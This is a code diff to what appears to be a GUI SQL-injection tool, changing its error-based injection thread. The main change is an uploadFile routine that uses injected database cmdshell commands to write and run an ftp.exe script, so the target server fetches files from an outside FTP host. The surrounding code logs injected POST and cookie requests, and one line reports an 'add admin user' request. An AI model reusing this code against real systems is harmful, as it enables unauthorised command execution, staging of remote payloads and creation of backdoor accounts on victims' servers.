@@ -142,7 +142,8 @@ class ErrorBased(QtCore.QThread):
             postData = self.preparePostData(data, query, isCmd)
             if self.isCookieInjection(cookie):
                 cookie = self.buildUrl(cookie, query, isCmd, True)
-            reqLog = "\n[POST] " + self.vars['url'] + "\n" + postData.decode(e_const.ENCODING)
+            reqLog = "\n[POST] " + self.vars['url'] + "\n+data+:\n{\n" + postData.decode(e_const.ENCODING)\
+                        + "\n}"
             if len(cookie) > 0:
                 reqLog += "\nCookie:" + cookie
                 urlOpener.addheaders = [('User-Agent', e_const.USER_AGENT), ('Cookie', cookie)]
@@ -428,6 +429,7 @@ class ErrorBased(QtCore.QThread):
         msg = (rowsInTable + " rows in " + self.vars['selected_table'])
         self.msgSignal.emit(msg)
         return
+        
 #Run Query     
     def runQuery(self):
         #If this select command
@@ -525,11 +527,16 @@ class ErrorBased(QtCore.QThread):
         
 #Upload file using built-in ftp.exe 
     def uploadFile(self):
+        #if defined non-standart ftp port
+        ipaddr = self.vars['ip'].replace(":", " ")
         ftpFiles = self.vars['ftpFiles']
-        tmp_file = self.vars['ftpPath'] + "ftp.txt"
+        tmp_file = self.vars['ftpPath'] + "xftp.txt"
         execCmd = self.dbType('exec_cmdshell')
         #del ..\temp\ftp.txt /Q
         query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("del " + tmp_file + " /Q")})
+        self.web_request(query, True)
+        #echo open 127.0.0.1 21> ..\temp\ftp.txt
+        query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("echo open " + ipaddr + "> " + tmp_file)})
         self.web_request(query, True)
         #echo login> ..\temp\ftp.txt
         query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("echo " + self.vars['login'] + "> " + tmp_file)})
@@ -552,7 +559,7 @@ class ErrorBased(QtCore.QThread):
         query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("echo bye>> " + tmp_file)})
         self.web_request(query, True)
         #ftp -s:..\temp\ftp.txt IP
-        query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("ftp -s:" + tmp_file + " " + self.vars['ip'])})
+        query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("ftp -s:" + tmp_file)})
         self.web_request(query, True)
         #del ..\temp\ftp.txt /Q
         query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("del " + tmp_file + " /Q")})
@@ -570,3 +577,5 @@ class ErrorBased(QtCore.QThread):
         self.web_request(query, True)
         self.msgSignal.emit("Add admin user request sent.")
         
+    def blind_getResponseLenght(self):
+        return
